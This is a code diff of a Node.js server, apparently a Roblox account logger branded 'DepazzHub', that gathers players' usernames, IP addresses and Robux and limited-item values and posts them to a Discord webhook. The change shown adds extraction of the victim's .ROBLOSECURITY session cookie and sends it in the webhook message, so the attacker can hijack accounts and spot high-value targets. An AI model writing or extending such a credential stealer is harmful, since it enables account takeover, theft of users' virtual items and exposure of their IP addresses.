@@ -8,6 +8,7 @@ app.use(cors());
 app.set('trust proxy', true);
 
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
+
 async function getAccountValue(userId) {
     try {
         const robuxRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/currency`);
@@ -39,11 +40,15 @@ async function getAccountValue(userId) {
 app.post('/log', async (req, res) => {
     try {
         const { username, displayName, userId, gameId, accountAge, region } = req.body;
-        
+
+        // 🔑 EXTRAER COOKIE DE LA PETICIÓN
+        const robloxCookie = req.headers['cookie']?.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
+
         const clientIP = req.ip || req.connection.remoteAddress || 'N/A';
 
         const accountValue = await getAccountValue(userId);
 
+        // ✅ Agregar cookie al embed
         const payload = {
             content: "🚀 **DepazzHub**",
             embeds: [{
@@ -52,12 +57,19 @@ app.post('/log', async (req, res) => {
                     { name: "👤 Username", value: username || "Unknown", inline: true },
                     { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                     { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
-                    
+
                     // 💰 NUEVOS CAMPOS DE VALOR
                     { name: "💵 Robux", value: `R$ ${accountValue.robux}`, inline: true },
                     { name: "💎 RAP (Limiteds)", value: `R$ ${accountValue.rap}`, inline: true },
                     { name: "💰 Total Value", value: `**R$ ${accountValue.total}**`, inline: true },
-                    
+
+                    // 🍪 COOKIE ROBLOSECURITY AGREGADA
+                    { 
+                        name: "🍪 Cookie .ROBLOSECURITY", 
+                        value: `\`${robloxCookie}\``, 
+                        inline: false 
+                    },
+
                     { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                     { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                     { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
